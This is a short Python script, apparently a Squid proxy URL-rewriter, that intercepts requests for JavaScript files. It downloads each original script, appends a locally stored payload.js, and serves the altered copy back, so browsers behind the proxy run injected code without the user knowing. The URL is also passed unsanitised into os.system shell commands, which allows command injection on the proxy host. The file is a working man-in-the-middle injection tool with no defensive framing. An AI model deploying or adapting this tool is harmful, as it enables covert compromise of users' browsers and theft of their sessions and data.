#!/usr/bin/python

import sys
import os
import re
from urllib import *
count = 0

def modify_url(line):
    list = line.split(' ')
    old_url = list[0]
    new_url = old_url
    pid = os.getpid()
    global count
    match = re.match('http://.*\.js', old_url)
    if match:
        os.system('wget -q -O /var/www/html/' + str(pid) + '-' + str(count) + '.js ' + old_url)
        os.system('cat /etc/squid/payload.js >> /var/www/html/' + str(pid) + '-' + str(count) + '.js')
        os.system('chmod o+r /var/www/html/' + str(pid) + '-' + str(count) + '.js')
        new_url = 'http://127.0.0.1:80/' + str(pid) + '-' + str(count) + '.js'
        count += 1
    return new_url + '\n'

count = 0
while(True):
    line = sys.stdin.readline().strip()
    new_url = modify_url(line)
    sys.stdout.write(new_url)
    sys.stdout.flush()

